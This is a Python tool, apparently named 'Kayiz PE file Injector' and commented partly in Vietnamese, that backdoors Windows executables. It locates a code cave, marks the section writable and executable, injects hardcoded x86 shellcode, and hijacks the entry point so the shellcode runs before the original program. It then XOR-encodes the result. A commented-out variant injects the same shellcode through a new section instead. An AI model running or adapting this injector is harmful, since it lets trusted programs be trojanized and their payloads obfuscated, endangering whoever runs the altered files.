
import sys
import pefile
import mmap
import os
import argparse
import time
from pyfiglet import Figlet

custom_fig = Figlet(font='graffiti')
print(custom_fig.renderText('Kayiz'))
print ("""
Usage: -f: Input file
       -k: Key using to encode
       -o: Output file
	""")
parser = argparse.ArgumentParser(description='Kayiz PE file Injector')
parser.add_argument('--file','-f',help='', dest='file')
parser.add_argument('--key','-k',help='key to encrypt',dest='key')
parser.add_argument("-o","--output",help="output payload into file",type=str,dest="output")
args = parser.parse_args()
def FindCave():
    global pe
    filedata = open(file, "rb") # Doc File
    print(" Min Cave Size: " + str(minCave) + " bytes")
    # Set PE file Image Base
    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)
    caveFound = False
    # Loop through sections to identify code cave of minimum bytes
    # Trong Section chua PointerToRawData 
    for section in pe.sections:
        sectionCount = 0
        if section.SizeOfRawData != 0:
            position = 0
            count = 0
            filedata.seek(section.PointerToRawData, 0)
            data = filedata.read(section.SizeOfRawData) #Doc file tu rawdata
            for byte in data: #data chua 1 chuoi byte
                position += 1
                if byte == 0x00:
                    count += 1
                else:
                    if count > minCave: #minCave la do dai Shell code
                        caveFound = True
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base_hex + section.VirtualAddress + position - count - 1
                        section.Characteristics = 0xE0000040
                        return vir_addr, raw_addr #raw address là byte thu bao nhieu tren file, vir_addr dia chi ao tren RAM
                    count = 0
        sectionCount += 1
    filedata.close()
##def align(val_to_align, alignment):
   # return ((val_to_align + alignment - 1) / alignment) * alignment
"""def Excute(filename):
	exe_path = filename
	shellcode = bytes(	b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
	b"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
	b"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
	b"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
	b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
	b"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
	b"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
	b"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
	b"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
	b"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
	b"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
	b"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
	b"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
	b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x33\x3a\x58\x20\x68\x4e\x54"
	b"\x32\x30\x31\xdb\x88\x5c\x24\x06\x89\xe3\x68\x33\x33\x58\x20"
	b"\x68\x35\x32\x30\x35\x68\x33\x2d\x31\x38\x68\x32\x30\x34\x39"
	b"\x68\x2d\x31\x38\x35\x68\x30\x34\x33\x31\x68\x31\x38\x35\x32"
	b"\x31\xc9\x88\x4c\x24\x1a\x89\xe1\x31\xd2\x6a\x30\x53\x51\x52"
	b"\xff\xd0\x31\xc0\x50\xff\x55\x08")

	# STEP 0x01 - Resize the Executable
	# Note: I added some more space to avoid error
	print ("[*] STEP 0x01 - Resize the Executable")

	original_size = os.path.getsize(exe_path)
	print ("\t[+] Original Size = %d" % original_size)
	fd = open(exe_path, 'a+b')
	map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
	map.resize(original_size + 0x2000)
	map.close()
	fd.close()

	print ("\t[+] New Size = %d bytes\n" % os.path.getsize(exe_path))

	# STEP 0x02 - Add the New Section Header
	print ("[*] STEP 0x02 - Add the New Section Header")

	pe = pefile.PE(exe_path)
	number_of_section = pe.FILE_HEADER.NumberOfSections
	last_section = number_of_section - 1
	file_alignment = pe.OPTIONAL_HEADER.FileAlignment
	section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
	new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

	# Look for valid values for the new section header
	raw_size = align(0x1000, file_alignment)
	virtual_size = align(0x1000, section_alignment)
	raw_offset = align((pe.sections[last_section].PointerToRawData +
	                    pe.sections[last_section].SizeOfRawData),
	                   file_alignment)

	virtual_offset = align((pe.sections[last_section].VirtualAddress +
	                        pe.sections[last_section].Misc_VirtualSize),
	                       section_alignment)

	# CODE | EXECUTE | READ | WRITE
	characteristics = 0xE0000020
	# Section name must be equal to 8 bytes
	name = ".axc" + (4 * '\x00')

	# Create the section
	# Set the name
	pe.set_bytes_at_offset(new_section_offset, name)
	print ("\t[+] Section Name = %s" % name)
	# Set the virtual size
	pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
	print ("\t[+] Virtual Size = %s" % hex(virtual_size))
	# Set the virtual offset
	pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
	print ("\t[+] Virtual Offset = %s" % hex(virtual_offset))
	# Set the raw size
	pe.set_dword_at_offset(new_section_offset + 16, raw_size)
	print ("\t[+] Raw Size = %s" % hex(raw_size))
	# Set the raw offset
	pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
	print ("\t[+] Raw Offset = %s" % hex(raw_offset))
	# Set the following fields to zero
	pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
	# Set the characteristics
	pe.set_dword_at_offset(new_section_offset + 36, characteristics)
	print ("\t[+] Characteristics = %s\n" % hex(characteristics))

	# STEP 0x03 - Modify the Main Headers
	print ("[*] STEP 0x03 - Modify the Main Headers")
	pe.FILE_HEADER.NumberOfSections += 1
	print ("\t[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections)
	pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
	print ("\t[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage)

	pe.write(exe_path)

	pe = pefile.PE(exe_path)
	number_of_section = pe.FILE_HEADER.NumberOfSections
	last_section = number_of_section - 1
	new_ep = pe.sections[last_section].VirtualAddress
	print ("\t[+] New Entry Point = %s" % hex(pe.sections[last_section].VirtualAddress))
	oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	print ("\t[+] Original Entry Point = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

	# STEP 0x04 - Inject the Shellcode in the New Section
	print ("[*] STEP 0x04 - Inject the Shellcode in the New Section")

	raw_offset = pe.sections[last_section].PointerToRawData
	pe.set_bytes_at_offset(raw_offset, shellcode)
	print ("\t[+] Shellcode wrote in the new section")

	pe.write(exe_path)
	"""
def xor(data, key):
    l = len(key)
    return bytearray((
        (data[i] ^ key[i % l]) for i in range(0,len(data))
    ))
# Read two files as byte arrays
file = args.file 

# Load to pefile object
pe = pefile.PE(file)

shellcode = bytes(
	b""
	b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
	b"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
	b"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
	b"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
	b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
	b"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
	b"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
	b"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
	b"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
	b"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
	b"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
	b"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
	b"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
	b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x33\x3a\x58\x20\x68\x4e\x54"
	b"\x32\x30\x31\xdb\x88\x5c\x24\x06\x89\xe3\x68\x33\x33\x58\x20"
	b"\x68\x35\x32\x30\x35\x68\x33\x2d\x31\x38\x68\x32\x30\x34\x39"
	b"\x68\x2d\x31\x38\x35\x68\x30\x34\x33\x31\x68\x31\x38\x35\x32"
	b"\x31\xc9\x88\x4c\x24\x1a\x89\xe1\x31\xd2\x6a\x30\x53\x51\x52"
	b"\xff\xd0\x31\xc0\x50\xff\x55\x08"
)

# Save file to variable
newFile = args.file
# Stores Image Base
image_base = pe.OPTIONAL_HEADER.ImageBase
minCave = (4 + len(shellcode)) + 10 #Do dai o trong

try:
    newEntryPoint, newRawOffset = FindCave()
except:
    sys.exit(" No Code Cave Found")

# Stores original entrypoint
#Address tren RAM cua chuong trinh. Vi tri dau tien cua program
origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint) 
# Sets new Entry Point and aligns address
pe.OPTIONAL_HEADER.AddressOfEntryPoint = newEntryPoint - image_base
returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

# INJECT
shellcode += (b"\xB8" + returnAddress)
paddingBytes = b""

#Them padding vao sau Shellcode
if len(shellcode) % 4 != 0:
    paddingBytes = b"\x90" * 10
    shellcode += paddingBytes
shellcode += (b"\xFF\xD0")
#Them padding vao trước shellcode
shellcode = b"\x90\x90\x90\x90" + shellcode 

# Injects Shellcode
pe.set_bytes_at_offset(newRawOffset, shellcode)

# Save and close files
pe.write(newFile)

pe.close()
print("\n")
key = args.key
key = key.encode()
fileN=args.file
data = bytearray(open(fileN, 'rb').read())
content = xor(data,key).hex()
if args.output:
        print ("[+] Writting into " + args.output)
        with open(args.output,"w") as f:
                f.write(content)
else:
        print ("[+] Writting into " + 'SaoMayLuoiVay.exe')
        with open('SaoMayLuoiVay.exe',"w") as f:
                f.write(content)
for remaining in range(5, 0, -1):
    sys.stdout.write("\r")
    sys.stdout.write("{:2d} seconds remaining.".format(remaining))
    sys.stdout.flush()
    time.sleep(1)

sys.stdout.write("\rComplete!            \n")